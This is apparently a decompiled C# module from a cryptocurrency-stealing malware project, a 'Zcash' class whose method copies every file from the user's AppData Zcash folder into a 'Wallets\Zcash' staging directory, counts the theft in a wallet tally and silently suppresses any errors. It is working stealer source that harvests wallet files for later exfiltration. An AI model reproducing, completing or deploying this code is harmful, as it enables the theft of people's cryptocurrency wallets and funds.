﻿using System;
using System.IO;

namespace SHARP
{
	// Token: 0x02000038 RID: 56
	internal class Zcash
	{
		// Token: 0x0600010C RID: 268 RVA: 0x00006490 File Offset: 0x00004690
		public static void ZecwalletStr(string directorypath)
		{
			try
			{
				foreach (FileInfo fileInfo in new DirectoryInfo(Help.AppData + "\\Zcash\\").GetFiles())
				{
					Directory.CreateDirectory(directorypath + Zcash.ZcashDir);
					fileInfo.CopyTo(directorypath + Zcash.ZcashDir + fileInfo.Name);
				}
				Counting.Wallets++;
			}
			catch
			{
			}
		}

		// Token: 0x04000087 RID: 135
		public static int count = 0;

		// Token: 0x04000088 RID: 136
		public static string ZcashDir = "\\Wallets\\Zcash\\";
	}
}
